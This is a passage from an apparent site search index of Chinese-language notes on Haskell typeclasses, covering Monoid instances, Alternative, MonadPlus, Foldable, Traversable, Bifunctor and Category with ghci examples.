\u662f\u4e00\u4e2a\u5e7a\u534a\u7fa4\uff1a <pre><code>instance Semigroup [a] where \n    (&lt;&gt;) = (++)\n\ninstance Monoid [a] where \n    mempty = [] \n    mconcat xss = [x | xs &lt;- xss, x &lt;- xs]\n</code></pre> \u5217\u8868\u7684\u5355\u4f4d\u5143\u7d20\uff08mempty\uff09\u5c31\u662f\u7a7a\u5217\u8868 []\uff0c\u8fd0\u7b97\u7b26\u5c31\u662f\u5408\u5e76\u5217\u8868 (++)\uff0cmconcat \u4e5f\u7528\u5217\u8868\u63a8\u5bfc\u91cd\u65b0\u5b9e\u73b0\u63d0\u9ad8\u6548\u7387 <pre><code>ghci&gt; mempty :: [Int] \n[]\nghci&gt; [1, 2] &lt;&gt; [3, 4]\n[1,2,3,4]\nghci&gt; [1, 2] `mappend` [3, 4]\n[1,2,3,4]\nghci&gt; mconcat [[1,2], [3,4]]\n[1,2,3,4]\n</code></pre></p>"},{"location":"cs/pl/haskell/#ordering","title":"Ordering","text":"<p><pre><code>instance Semigroup Ordering where\n    LT &lt;&gt; _ = LT\n    EQ &lt;&gt; y = y\n    GT &lt;&gt; _ = GT\n\ninstance Monoid Ordering where\n    mempty = EQ\n</code></pre> \u4e3b\u8981\u53ef\u4ee5\u7528\u4e8e\u6bd4\u8f83\u5b57\u5178\u5e8f\uff1a <pre><code>ghci&gt; mconcat (zipWith compare \"abcd\" \"acbd\")\nLT\n</code></pre></p>"},{"location":"cs/pl/haskell/#sum-product","title":"Sum &amp; Product","text":"<p>\u5bf9\u4e8e\u6570\u5b57\uff0c\u52a0\u6cd5\u548c\u4e58\u6cd5\u90fd\u6ee1\u8db3\u7ed3\u5408\u5f8b\uff0c\u6240\u4ee5\u5bf9\u4e8e Num\uff0c\u6709\u4e24\u79cd\u5b9e\u73b0 Monoid \u7684\u65b9\u5f0f\uff0c\u4f46\u662f\u4e0d\u80fd\u4e3a\u540c\u4e00\u7c7b\u578b\u8bbe\u7f6e\u4e24\u79cd\u5b9e\u4f8b\u65b9\u5f0f\uff0c\u6240\u4ee5 <code>Data.Monoid</code> \u4e2d\u63d0\u4f9b\u4e86\u4e24\u4e2a\u5305\u88c5\u5668\u2014\u2014\u2014\u2014 Sum \u548c Product\uff1a <pre><code>newtype Sum a = Sum {getSum :: a} deriving (...)\nnewtype Product a = Product {getProduct :: a} deriving (...)\n</code></pre> \u5b83\u4eec\u4f7f\u7528 Sum \u6216 Product \u6765\u5305\u88c5\u8d77\u4e00\u4e2a\u6570\u5b57\uff0c\u53ef\u4ee5\u901a\u8fc7 getSum \u6216 getProduct \u6765\u83b7\u53d6\u5176\u4e2d\u7684\u503c</p> <p>\u5bf9\u4e8e\u52a0\u6cd5\uff0c\u4e8c\u5143\u64cd\u4f5c\u4e3a (+)\uff0c\u5355\u4f4d\u5143\u7d20\u4e3a 0\uff1b\u5bf9\u4e8e\u4e58\u6cd5\uff0c\u4e8c\u5143\u64cd\u4f5c\u4e3a (*)\uff0c\u5355\u4f4d\u5143\u7d20\u4e3a 1: <pre><code>instance Num a =&gt; Semigroup (Sum a) where\n    (&lt;&gt;) = coerce ((+) :: a -&gt; a -&gt; a)\n\ninstance Num a =&gt; Monoid (Sum a) where\n    mempty = Sum 0\n\ninstance Num a =&gt; Semigroup (Product a) where\n    (&lt;&gt;) = coerce ((*) :: a -&gt; a -&gt; a)\n\ninstance Num a =&gt; Monoid (Product a) where\n    mempty = Product 1\n</code></pre> <pre><code>ghci&gt; Sum 5 &lt;&gt; Sum 6 &lt;&gt; Sum 10\nSum {getSum = 21}\nghci&gt; getSum . mconcat . fmap Sum $ [5, 6, 10]\n21\nghci&gt; Product 5 &lt;&gt; Product 6 &lt;&gt; Product 10\nProduct {getProduct = 300}\nghci&gt; getProduct . mconcat . fmap Product $ [5, 6, 10]\n300\n</code></pre></p>"},{"location":"cs/pl/haskell/#all-any","title":"All &amp; Any","text":"<p>\u548c\u6570\u5b57\u4e00\u6837\uff0c\u5e03\u5c14\u503c\u4e5f\u6709\u4e24\u79cd\u5b9e\u73b0 Monoid \u7684\u65b9\u5f0f\uff0c\u56e0\u6b64 <code>Data.Monoid</code> \u6a21\u5757\u4e2d\u4e5f\u63d0\u4f9b\u4e86\u4e24\u4e2a\u5305\u88c5\u5668\uff0c\u5206\u522b\u5b9e\u73b0\u4e86\u8fd9\u4e24\u79cd Monoid\uff1a <pre><code>newtype All = All { getAll :: Bool } deriving (...)\n\ninstance Semigroup All where\n        (&lt;&gt;) = coerce (&amp;&amp;)\n\ninstance Monoid All where\n        mempty = All True\n\n\nnewtype Any = Any { getAny :: Bool } deriving (...)\n\ninstance Semigroup Any where\n        (&lt;&gt;) = coerce (||)\n\ninstance Monoid Any where\n        mempty = Any False\n</code></pre> <pre><code>ghci&gt; getAll (All True &lt;&gt; mempty &lt;&gt; All False)\nFalse\nghci&gt; getAll (mconcat (map (\\x -&gt; All (even x)) [2,4,6,7,8]))\nFalse\nghci&gt; getAny (Any True &lt;&gt; mempty &lt;&gt; Any False)\nTrue\nghci&gt; getAny (mconcat (map (\\x -&gt; Any (even x)) [2,4,6,7,8]))\nTrue\n</code></pre></p>"},{"location":"cs/pl/haskell/#monoid-a-maybe-a","title":"Monoid a =&gt; Maybe a","text":"<p>\u5982\u679c a \u662f\u4e00\u4e2a(\u5e7a)\u534a\u7fa4\uff0c\u90a3\u4e48 Maybe a \u4e5f\u662f\u4e00\u4e2a\u5e7a\u534a\u7fa4\uff0c\u5355\u4f4d\u5143\u5c31\u662f Nothing\uff1a <pre><code>instance Semigroup a =&gt; Semigroup (Maybe a) where\n    Nothing &lt;&gt; b       = b\n    a       &lt;&gt; Nothing = a\n    Just a  &lt;&gt; Just b  = Just (a &lt;&gt; b)\n\ninstance Semigroup a =&gt; Monoid (Maybe a) where\n    mempty = Nothing\n</code></pre> <pre><code>ghci&gt; Nothing &lt;&gt; Just \"andy\"\nJust \"andy\"\nghci&gt; Just LT &lt;&gt; Nothing\nJust LT\nghci&gt; Just (Sum 3) &lt;&gt; Just (Sum 4) \nJust (Sum {getSum = 7})\n</code></pre></p>"},{"location":"cs/pl/haskell/#first-last","title":"First &amp; Last","text":"<p>\u5bf9\u4e8e Maybe \u4e5f\u6709\u4e24\u79cd\u5b9e\u73b0 Monoid \u7684\u65b9\u6cd5\uff0c\u5373 &lt;&gt; \u64cd\u4f5c\u6bcf\u6b21\u6052\u53d6\u5de6\u8fb9\u548c\u6bcf\u6b21\u6052\u53d6\u53f3\u8fb9\uff08\u5728\u6ca1\u6709 Nothing \u7684\u60c5\u51b5\u4e0b\uff09\uff0c\u6240\u4ee5 <code>Data.Monoid</code> \u6a21\u5757\u4e2d\u4e5f\u63d0\u4f9b\u4e86\u4e24\u4e2a\u65b0\u7684\u5305\u88c5\u5668\uff1aFirst \u548c Last\uff1a <pre><code>newtype First a = First { getFirst :: Maybe a } deriving (...)\n\ninstance Semigroup (First a) where\n    First Nothing &lt;&gt; b = b\n    a             &lt;&gt; _ = a\n\ninstance Monoid (First a) where\n    mempty = First Nothing\n\n\nnewtype Last a = Last { getLast :: Maybe a } deriving (...)\n\ninstance Semigroup (Last a) where\n    a &lt;&gt; Last Nothing = a\n    _ &lt;&gt; b            = b\n\ninstance Monoid (Last a) where\n    mempty = Last Nothing\n</code></pre> <pre><code>ghci&gt; getFirst (First (Just \"hello\") &lt;&gt; First Nothing &lt;&gt; First (Just \"world\"))\nJust \"hello\"\nghci&gt; getLast (Last (Just \"hello\") &lt;&gt; Last Nothing &lt;&gt; Last (Just \"world\"))\nJust \"world\"\nghci&gt; getFirst . mconcat . map First $ [Nothing, Just 9, Just 10]  \nJust 9\nghci&gt; getLast . mconcat . map Last $ [Nothing, Just 9, Just 10]  \nJust 10\n</code></pre></p>"},{"location":"cs/pl/haskell/#min-max","title":"Min &amp; Max","text":"<p>\u5bf9\u4e8e\u6709\u754c\u7684\u7c7b\u578b\uff0c\u4e5f\u6709\u4e24\u79cd\u5b9e\u73b0 Monoid \u7684\u65b9\u5f0f\uff0c\u6bcf\u6b21\u4e8c\u5143\u64cd\u4f5c\u90fd\u53d6\u6700\u5c0f\u6216\u6700\u5927\u3002<code>Data.Semigroup</code> \u6a21\u5757\u4e2d\u63d0\u4f9b\u4e86\u4e24\u4e2a\u5305\u88c5\u5176\u5668\uff1aMin \u548c Max\uff1a <pre><code>newtype Min a = Min { getMin :: a } deriving (...)\n\ninstance Ord a =&gt; Semigroup (Min a) where\n    (&lt;&gt;) = coerce (min :: a -&gt; a -&gt; a)\n\ninstance (Ord a, Bounded a) =&gt; Monoid (Min a) where\n    mempty = maxBound\n\n\nnewtype Max a = Max { getMax :: a } deriving (...)\n\ninstance Ord a =&gt; Semigroup (Max a) where\n    (&lt;&gt;) = coerce (max :: a -&gt; a -&gt; a)\n\ninstance (Ord a, Bounded a) =&gt; Monoid (Max a) where\n    mempty = minBound\n</code></pre> <pre><code>ghci&gt; Min 3 &lt;&gt; Min 5\nMin {getMin = 3}\nghci&gt; Max 3 &lt;&gt; Max 5\nMax {getMax = 5}\nghci&gt; getMin . mconcat . map Min $ [1,2,3] :: Int\n1\nghci&gt; getMax . mconcat . map Max $ [1,2,3] :: Int\n3\n</code></pre></p>"},{"location":"cs/pl/haskell/#_21","title":"\u5143\u7ec4","text":"<p>\u5f53\u5143\u7ec4\u5185\u7684\u6240\u6709\u5143\u7d20\u90fd\u662f\u5e7a\u534a\u7fa4\u65f6\uff0c\u6574\u4e2a\u5143\u7ec4\u4e5f\u662f\u4e00\u4e2a\u5e7a\u534a\u7fa4\uff1a <pre><code>instance (Semigroup a, Semigroup b) =&gt; Semigroup (a, b) where\n        (a,b) &lt;&gt; (a',b') = (a&lt;&gt;a',b&lt;&gt;b')\n        stimes n (a,b) = (stimes n a, stimes n b)\n\ninstance (Monoid a, Monoid b) =&gt; Monoid (a,b) where\n        mempty = (mempty, mempty)\n</code></pre> <pre><code>ghci&gt; mconcat $ map (\\x -&gt; (Min x, Max x)) [1..10] :: (Min Int, Max Int)\n(Min {getMin = 1},Max {getMax = 10})\n</code></pre></p>"},{"location":"cs/pl/haskell/#monoid-laws","title":"Monoid Laws","text":"<ul> <li>mempty &lt;&gt; x = x</li> <li>x &lt;&gt; mempty = x</li> <li>(x &lt;&gt; y) &lt;&gt; z = x &lt;&gt; (y &lt;&gt; z)</li> </ul>"},{"location":"cs/pl/haskell/#monoidal-classes","title":"Monoidal classes","text":"<p>Applicative\u3001Monad\u3001Arrow \u90fd\u6709\u6709\u5e7a\u534a\u7fa4\u6027\u8d28\u7684\u5b50\u7c7b\u578b\u7c7b\uff0c\u5206\u522b\u662f Alternative\u3001MonadPlus\u3001ArrowPlus</p>"},{"location":"cs/pl/haskell/#alternative","title":"Alternative","text":"<p><pre><code>class Applicative f =&gt; Alternative f where\n    -- | The identity of '&lt;|&gt;'\n    empty :: f a\n    -- | An associative binary operation\n    (&lt;|&gt;) :: f a -&gt; f a -&gt; f a\n\n    some :: f a -&gt; f [a]\n    some v = (:) &lt;$&gt; v &lt;*&gt; many v\n    many :: f a -&gt; f [a]\n    many v = some v &lt;|&gt; pure []\n</code></pre> \u5176\u4e2d empty \u662f\u5e7a\u534a\u7fa4\u4e2d\u7684\u5355\u4f4d\u5143\u7d20\uff0c&lt;|&gt; \u662f\u5e7a\u534a\u7fa4\u4e2d\u7684\u4e8c\u5143\u8fd0\u7b97\u7b26\u3002some \u548c many \u662f\u4e24\u4e2a\u51fd\u6570\uff08\u610f\u4e49\u8fd8\u4e0d\u61c2\uff09</p>"},{"location":"cs/pl/haskell/#alternative_1","title":"Alternative \u5b9e\u4f8b","text":""},{"location":"cs/pl/haskell/#_22","title":"[]","text":"<p><pre><code>instance Alternative [] where\n    empty = []\n    (&lt;|&gt;) = (++)\n</code></pre> \u548c Monoid \u4e00\u6837\uff0c\u5355\u4f4d\u5143\u7d20\u662f\u7a7a\u5217\u8868\uff0c\u4e8c\u5143\u8fd0\u7b97\u662f\u5217\u8868\u5408\u5e76 <pre><code>ghci&gt; [1,2,3] &lt;|&gt; empty &lt;|&gt; [4,5]\n[1,2,3,4,5]\nghci&gt; some []\n[]\nghci&gt; many []\n[[]]\n</code></pre></p>"},{"location":"cs/pl/haskell/#maybe_3","title":"Maybe","text":"<p><pre><code>instance Alternative Maybe where\n    empty = Nothing\n    Nothing &lt;|&gt; r = r\n    l       &lt;|&gt; _ = l\n</code></pre> Maybe \u4f5c\u4e3a Alternative \u7684\u5355\u4f4d\u5143\u7d20\u662f Nothing\uff0c\u4e8c\u5143\u8fd0\u7b97\u662f\u59cb\u7ec8\u53d6\u5de6\u8fb9\uff08\u5f53\u5de6\u8fb9\u4e0d\u4e3a Nothing \u65f6\uff09 <pre><code>ghci&gt; Nothing &lt;|&gt; Just 1 &lt;|&gt; Just 2 \nJust 1 \nghci&gt; some Nothing\nNothing \nghci&gt; many Nothing \nJust []\n</code></pre></p>"},{"location":"cs/pl/haskell/#ziplist_1","title":"ZipList","text":"<p><pre><code>instance Alternative ZipList where\n   empty = ZipList []\n   ZipList xs &lt;|&gt; ZipList ys = ZipList (xs ++ drop (length xs) ys)\n</code></pre> <pre><code>&lt;&gt;getZipList $ ZipList [1,2] &lt;|&gt; ZipList [3,4,5,6]\n[1,2,5,6]\n&lt;&gt;getZipList $ ZipList [1,2,3,4] &lt;|&gt; ZipList [3,4,5,6]\n[1,2,3,4]\n</code></pre></p>"},{"location":"cs/pl/haskell/#alternative-laws","title":"Alternative Laws","text":"<ul> <li><code>Monoid laws</code>:     <pre><code>empty &lt;|&gt; x = x \nx &lt;|&gt; empty = x \n(x &lt;|&gt; y) &lt;|&gt; z = x &lt;|&gt; (y &lt;|&gt; z)\n</code></pre></li> <li><code>Left zero law</code>\uff1aempty &lt;*&gt; f = empty </li> </ul> <p>\u4ee5\u4e0a\u7684\u5b9a\u5f8b\u662f\u90fd\u6ee1\u8db3\u90fd\uff0c\u4e0b\u9762\u7684\u5b9a\u5f8b\u53ea\u6709\u90e8\u5206\u6ee1\u8db3\uff1a</p> <ul> <li><code>Right zero law</code>\uff1af &lt;*&gt; empty = empty \uff08\u5927\u90e8\u5206\u5305\u62ec Maybe\u3001[] \u6ee1\u8db3\uff0cIO \u4e0d\u6ee1\u8db3\uff09</li> <li><code>Left distribution</code>\uff1a(a &lt;|&gt; b) &lt;&gt; c = (a &lt;&gt; c) &lt;|&gt; (b &lt;*&gt; c) \uff08Maybe\u3001[] \u6ee1\u8db3\uff0cIO \u53ca\u5927\u90e8\u5206 parsers \u4e0d\u6ee1\u8db3\uff09</li> <li><code>Right distribution</code>\uff1aa &lt;&gt; (b &lt;|&gt; c) = (a &lt;&gt; b) &lt;|&gt; (a &lt;*&gt; c) \uff08\u5927\u90e8\u5206\u4e0d\u6ee1\u8db3\uff0c\u4f46 Maybe \u6ee1\u8db3\uff09</li> <li><code>Left catch</code>\uff1a(pure a) &lt;|&gt; x = pure a \uff08Maybe\u3001IO\u3001parsers \u6ee1\u8db3\uff0c\u4f46 [] \u4e0d\u6ee1\u8db3\uff09</li> </ul>"},{"location":"cs/pl/haskell/#_23","title":"\u5e38\u7528\u51fd\u6570","text":"<ul> <li><code>asum</code> :: (Foldable t, Alternative f) =&gt; t (f a) -&gt; f a\uff0c\u76f8\u5f53\u4e8e foldr (&lt;|&gt;) empty\uff1a     <pre><code>ghci&gt; asum [Nothing, Just 5, Just 3]\nJust 5\nghci&gt; asum [[2],[3],[4,5]]\n[2,3,4,5]\n</code></pre></li> <li><code>guard</code> :: (Alternative f) =&gt; Bool -&gt; f ()\uff1a     <pre><code>guard True  = pure ()\nguard False = empty \n</code></pre></li> </ul>"},{"location":"cs/pl/haskell/#monadplus","title":"MonadPlus","text":"<pre><code>class (Alternative m, Monad m) =&gt; MonadPlus m where\n   mzero :: m a\n   mzero = empty\n\n   mplus :: m a -&gt; m a -&gt; m a\n   mplus = (&lt;|&gt;)\n</code></pre>"},{"location":"cs/pl/haskell/#monadplus_1","title":"MonadPlus\u5b9e\u4f8b","text":"<p>[]\u3001Maybe \u90fd\u662f MonadPlus \u7684\u5b9e\u4f8b\uff0cmzero \u548c mplus \u90fd\u7531 Alternative \u5b9e\u73b0</p>"},{"location":"cs/pl/haskell/#monadplus-laws","title":"MonadPlus Laws","text":"<ul> <li><code>Monoid laws</code></li> <li><code>Left zero</code>\uff1amzero &gt;&gt;= f = mzero</li> <li><code>Right zero</code>\uff1am &gt;&gt; mzero = mzero </li> </ul>"},{"location":"cs/pl/haskell/#_24","title":"\u5e38\u7528\u51fd\u6570","text":"<ul> <li><code>msum</code> = asum </li> <li><code>mfilter</code>\uff1a     <pre><code>mfilter p ma = do\n    a &lt;- ma\n    if p a then return a else mzero\n</code></pre></li> </ul>"},{"location":"cs/pl/haskell/#arrowplus","title":"ArrowPlus","text":"<p>ArrowZero \u548c ArrowPlus \u5206\u522b\u4e3a Arrow \u8bbe\u7f6e\u4e86 Monoid \u4e2d\u7684\u5355\u4f4d\u5143\u7d20\u548c\u4e8c\u5143\u8fd0\u7b97\u7b26\uff0c\u4f7f\u4e4b\u6210\u4e3a\u4e86\u4e00\u4e2a\u5e7a\u534a\u7fa4\uff1a <pre><code>class Arrow arr =&gt; ArrowZero arr where\n    zeroArrow :: b `arr` c\n\nclass ArrowZero arr =&gt; ArrowPlus arr where\n    (&lt;+&gt;) :: (b `arr` c) -&gt; (b `arr` c) -&gt; (b `arr` c)\n</code></pre></p>"},{"location":"cs/pl/haskell/#typeclasses_1","title":"\u4e00\u4e9b\u5176\u5b83 Typeclasses","text":""},{"location":"cs/pl/haskell/#foldable","title":"Foldable","text":"<p>Foldable \u662f\u8868\u793a\u53ef\u4ee5\u6298\u53e0\uff08fold\uff09\u7684\u7c7b\u578b\u7c7b\uff0c\u5728 <code>Data.Foldable</code> \u4e2d\u5b9a\u4e49\uff0c\u8fd9\u4f7f\u5f97\u548c fold \u76f8\u5173\u7684\u51fd\u6570\u53ef\u4ee5\u7528\u5728\u4efb\u610f Foldable \u7684\u5b9e\u4f8b\u7c7b\u578b\u4e0a\u3002\u5b83\u7684\u5b9a\u4e49\u662f\uff1a <pre><code>class Foldable t where\n    fold     :: Monoid m =&gt; t m -&gt; m\n    foldMap  :: Monoid m =&gt; (a -&gt; m) -&gt; t a -&gt; m\n    foldMap' :: Monoid m =&gt; (a -&gt; m) -&gt; t a -&gt; m\n    foldr    :: (a -&gt; b -&gt; b) -&gt; b -&gt; t a -&gt; b\n    foldr'   :: (a -&gt; b -&gt; b) -&gt; b -&gt; t a -&gt; b\n    foldl    :: (b -&gt; a -&gt; b) -&gt; b -&gt; t a -&gt; b\n    foldl'   :: (b -&gt; a -&gt; b) -&gt; b -&gt; t a -&gt; b\n    foldr1   :: (a -&gt; a -&gt; a) -&gt; t a -&gt; a\n    foldl1   :: (a -&gt; a -&gt; a) -&gt; t a -&gt; a\n    toList   :: t a -&gt; [a]\n    null     :: t a -&gt; Bool\n    length   :: t a -&gt; Int\n    elem     :: Eq a =&gt; a -&gt; t a -&gt; Bool\n    maximum  :: Ord a =&gt; t a -&gt; a\n    minimum  :: Ord a =&gt; t a -&gt; a\n    sum      :: Num a =&gt; t a -&gt; a\n    product  :: Num a =&gt; t a -&gt; a\n    {-# MINIMAL foldMap | foldr #-}\n</code></pre> \u6700\u5c11\u53ea\u8981\u5b9e\u73b0 <code>foldr</code> \u548c <code>foldMap</code> \u5176\u4e2d\u4e4b\u4e00\u5c31\u53ef\u4ee5\u4f7f\u4e00\u4e2a\u7c7b\u578b\u6210\u4e3a Foldable \u7684\u5b9e\u4f8b\uff0c\u5176\u5b83\u7684\u51fd\u6570\u90fd\u6709\u7531\u8fd9\u4e24\u4e2a\u51fd\u6570\u63d0\u4f9b\u7684\u9ed8\u8ba4\u5b9e\u73b0\uff0c\u800c\u4e14\u8fd9\u4e24\u4e2a\u51fd\u6570\u4e4b\u95f4\u4e5f\u6709\u76f8\u4e92\u5b9e\u73b0\u3002\u56e0\u6b64\u53ea\u8981\u5b9e\u73b0 foldr \u6216 foldMap \u4e00\u4e2a\u51fd\u6570\u5c31\u53ef\u4ee5\u4f7f\u7528\u6240\u6709\u5176\u5b83 Foldable \u4e2d\u7684\u51fd\u6570\u3002foldr \u51fd\u6570\u5728\u524d\u9762\u5df2\u7ecf\u6709\u5b66\u8fc7\uff0cfoldMap \u7684\u4f8b\u5b50\u662f\uff1a <pre><code>ghci&gt; foldMap Sum [1, 3, 5]\nSum {getSum = 9}\nghci&gt; foldMap Product [1, 3, 5]\nProduct {getProduct = 15}\nghci&gt; foldMap (replicate 3) [1, 2, 3]\n[1,1,1,2,2,2,3,3,3]\n</code></pre></p>"},{"location":"cs/pl/haskell/#foldable_1","title":"Foldable \u5b9e\u4f8b","text":"<p>[]\u3001Maybe\u3001Either a\u3001(,) a \u90fd\u662f Foldable \u7684\u5b9e\u4f8b\uff0c\u6807\u51c6\u5bb9\u5668\u5e93\u4e2d\u7684 Map\u3001Set \u7b49\u4e5f\u90fd\u662f Foldable \u7684\u5b9e\u4f8b\u3002\u4e5f\u53ef\u4ee5\u81ea\u5b9a\u4e49\u4e8c\u53c9\u6811\u7c7b\u578b\uff0c\u5e76\u4f7f\u5176\u6210\u4e3a Foldable \u7684\u5b9e\u4f8b\uff1a <pre><code>data Tree a = Empty | Leaf a | Node (Tree a) a (Tree a)\n\ninstance Foldable Tree where \n    foldMap :: Monoid m =&gt; (a -&gt; m) -&gt; Tree a -&gt; m\n    foldMap f Empty        = mempty\n    foldMap f (Leaf x)     = f x\n    foldMap f (Node l k r) = foldMap f l `mappend` f k `mappend` foldMap f r\n</code></pre></p>"},{"location":"cs/pl/haskell/#_25","title":"\u5e38\u7528\u51fd\u6570","text":"<ul> <li><code>asum</code> :: (Alternative f, Foldable t) =&gt; t (f a) -&gt; f a\uff0c\u7528 &lt;|&gt; \u9010\u4e2a\u8fde\u63a5\u6240\u6709\u5143\u7d20</li> <li><code>sequenceA_</code> :: (Applicative f, Foldable t) =&gt; t (f a) -&gt; f ()\uff0c\u7531\u4e8e\u4e22\u5f03\u7ed3\u679c\uff0c\u6240\u4ee5 Foldable t \u5c31\u53ef\u4ee5\u6ee1\u8db3\uff1b\u56e0\u6b64\u4e0d\u540c\u4e8e sequenceA \u9700\u8981 Traversable</li> <li><code>traverse_</code> :: (Applicative f, Foldable t) =&gt; (a -&gt; f b) -&gt; t a -&gt; f ()</li> <li><code>for_</code> :: (Applicative f, Foldable t) =&gt; t a -&gt; (a -&gt; f b) -&gt; f ()</li> </ul>"},{"location":"cs/pl/haskell/#traversable","title":"Traversable","text":"<p>Traversable \u662f\u8868\u793a\u53ef\u904d\u5386\u7684\u7c7b\u578b\u7c7b\uff0c\u5728 <code>Data.Traversable</code> \u6a21\u5757\u4e2d\u5b9a\u4e49\uff0c\u5b83\u662f Foldable \u7684\u5347\u7ea7\u7248\uff0c\u540c\u65f6\u4e5f\u662f\u4e00\u4e2a Functor\uff0c\u5b83\u7684\u5b9a\u4e49\u662f\uff1a <pre><code>class (Functor t, Foldable t) =&gt; Traversable t where \n    traverse  :: Applicative f =&gt; (a -&gt; f b) -&gt; t a -&gt; f (t b)\n    sequenceA :: Applicative f =&gt; t (f a) -&gt; f (t a)\n    mapM      ::       Monad m =&gt; (a -&gt; m b) -&gt; t a -&gt; m (t b)\n    sequence  ::       Monad m =&gt; t (m a) -&gt; m (t a)\n    {-# MINIMAL traverse | sequenceA #-}\n</code></pre> \u6700\u5c11\u53ea\u9700\u8981\u5b9e\u73b0 traverse \u51fd\u6570\u6216\u8005 sequenceA \u51fd\u6570\u3002\u5176\u4e2d\u5404\u4e2a\u51fd\u6570\u7684\u529f\u80fd\u901a\u8fc7\u7c7b\u578b\u7b7e\u540d\u4e5f\u90fd\u80fd\u63a8\u6d4b\u51fa\u6765\u3002\u4f46\u662f\u5176\u4e2d mapM \u5c31\u662f traverse\uff0csequence \u5c31\u662f sequenceA\uff0c\u5b83\u4eec\u5b58\u5728\u53ea\u662f\u5386\u53f2\u9057\u7559</p>"},{"location":"cs/pl/haskell/#traversable_1","title":"Traversable \u5b9e\u4f8b","text":"<p><pre><code>instance Traversable Maybe where\n    traverse _ Nothing = pure Nothing\n    traverse f (Just x) = Just &lt;$&gt; f x\n\ninstance Traversable [] where\n    {-# INLINE traverse #-}\n    traverse f = foldr cons_f (pure [])\n      where cons_f x ys = liftA2 (:) (f x) ys\n\ninstance Traversable (Either a) where\n    traverse _ (Left x) = pure (Left x)\n    traverse f (Right y) = Right &lt;$&gt; f y\n\ninstance Traversable ((,) a) where\n    traverse f (x, y) = (,) x &lt;$&gt; f y\n\n...\n</code></pre> \u4e0a\u9762\u7684 Tree \u4e5f\u53ef\u4ee5\u6210\u4e3a Traversable \u7684\u5b9e\u4f8b\uff1a <pre><code>instance Functor Tree where\n    fmap :: (a -&gt; b) -&gt; Tree a -&gt; Tree b\n    fmap     g Empty        = Empty\n    fmap     g (Leaf x)     = Leaf $ g x\n    fmap     g (Node l x r) = Node (fmap g l)\n                                   (g x)\n                                   (fmap g r)\n\ninstance Traversable Tree where\n    traverse :: Applicative f =&gt; (a -&gt; f b) -&gt; Tree a -&gt; f (Tree b) \n    traverse g Empty        = pure Empty\n    traverse g (Leaf x)     = Leaf &lt;$&gt; g x\n    traverse g (Node l x r) = Node &lt;$&gt; traverse g l\n                                   &lt;*&gt; g x\n                                   &lt;*&gt; traverse g r\n</code></pre></p>"},{"location":"cs/pl/haskell/#traversable-laws","title":"Traversable Laws","text":"<p>Traversable \u4e5f\u6709\u4e24\u6761\u5b9a\u5f8b\uff1a 1. traverse Identity = Identity 2. traverse (Compose . fmap g . f) = Compose . fmap (traverse g) . traverse f </p> <p>\u5176\u4e2d Identity \u548c Compose \u5206\u522b\u5b9a\u4e49\u5728 <code>Data.Functor.Identity</code> \u548c <code>Data.Functor.Compose</code> \u4e24\u4e2a\u6a21\u5757\u4e2d\uff1a <pre><code>newtype Identity a = Identity { runIdentity :: a } deriving (...)\nnewtype Compose f g a = Compose { getCompose :: f (g a) } deriving (...)\n</code></pre></p>"},{"location":"cs/pl/haskell/#bifunctor","title":"Bifunctor","text":"<p>Functor \u7684\u5b9e\u4f8b\u7684 kind \u90fd\u662f * -&gt; *\uff0c\u56e0\u6b64 fmap \u53ea\u80fd\u5c06\u4e00\u4e2a\u51fd\u6570\u6620\u5c04\u5230\u4e00\u4e2a\u503c\u4e0a\u3002\u800c Bifunctor\uff08\u5728 <code>Data.Bifunctor</code> \u6a21\u5757\u4e2d\u5b9a\u4e49\uff09\u7684\u5b9e\u4f8b\u7684 kind \u662f * -&gt; * -&gt; *\uff0c\u800c\u4e14\u5b83\u7684 bimap \u53ef\u4ee5\u540c\u65f6\u5c06\u4e24\u4e2a\u51fd\u6570\u6620\u5c04\u5230\u4e24\u4e2a\u503c\u4e0a\uff1a <pre><code>class Bifunctor p where \n    bimap  :: (a -&gt; b) -&gt; (c -&gt; d) -&gt; p a c -&gt; p b d \n    first  :: (a -&gt; b) -&gt; p a c -&gt; p b c \n    second :: (b -&gt; c) -&gt; p a b -&gt; p a c \n    {-# MINIMAL bimap | first, second #-}\n</code></pre> \u540c\u65f6 bimap \u548c first,second \u4e4b\u95f4\u4e5f\u53ef\u4ee5\u76f8\u4e92\u8f6c\u6362\uff1a <pre><code>bimap f g = first f . second g\n\nfirst  f = bimap f id\nsecond g = bimap id g\n</code></pre> \u5bf9\u4e8e Functor\uff0c((,) e) \u548c Either e \u624d\u662f Functor \u7684\u5b9e\u4f8b\uff0c\u56e0\u4e3a\u4ed6\u4eec\u662f * -&gt; *\u3002\u4f46\u662f\u5bf9\u4e8e Bifunctor\uff0c(,) \u548c Either \u5c31\u662f Bifunctor \u7684\u5b9e\u4f8b\uff1a <pre><code>ghci&gt; bimap (+1) length (4, [1,2,3])\n(5,3)\n</code></pre></p>"},{"location":"cs/pl/haskell/#bifunctor-laws","title":"Bifunctor Laws","text":"<ol> <li>bimap id id = id     first id = id     second id = id</li> <li>bimap (f . g) (h . i) = bimap f h . bimap g i     first  (f . g) = first f  . first g     second (f . g) = second f . second g</li> </ol>"},{"location":"cs/pl/haskell/#category","title":"Category","text":"<p>Haskell \u4e2d\u7684 Category \u5c06\u4e00\u822c\u7684\u51fd\u6570\u63a8\u5e7f\u5230\u4e86\u666e\u904d\u7684\u6001\u5c04\u4e0a\uff0c\u5b83\u5728 <code>Control.Category</code> \u6a21\u5757\u4e2d\uff0c\u5b9a\u4e49\u662f\uff1a <pre><code>class Category cat where \n    id  :: cat a a \n    (.) :: cat b c -&gt; cat a b -&gt; cat a c\n</code></pre> \u5b83\u7684\u5b9e\u4f8b\u6709 <code>(-&gt;)</code> \u548c <code>Kleisli m</code>\uff1a <pre><code>instance Category (-&gt;) where\n    id = GHC.Base.id\n    (.) = (GHC.Base..)\n</code></pre> Kleisli \u662f\u4e00\u4e2a\u8303\u7574\uff0c\u7528\u6765\u8868\u793a\u51fd\u6570 a -&gt; m b\uff0cHaskell \u4e2d\uff0c\u5b83\u5728 <code>Control.Arrow</code> \u6a21\u5757\u4e2d\u5b9a\u4e49\uff1a <pre><code>newtype Kleisli m a b = Kleisli { runKleisli :: a -&gt; m b }\n\ninstance Monad m =&gt; Category (Kleisli m) where\n    id :: Kleisli m a a\n    id = Kleisli return\n\n    (.) :: Kleisli m b c -&gt; Kleisli m a b -&gt; Kleisli m a c\n    Kleisli g . Kleisli h = Kleisli (h &gt;=&gt; g)\n</code></pre> Category \u8981\u6ee1\u8db3\u7684\u5b9a\u5f8b\u53ea\u6709 id \u662f (.) \u64cd\u4f5c\u7684\u5355\u4f4d\u5143\uff0c\u4ee5\u53ca (.) 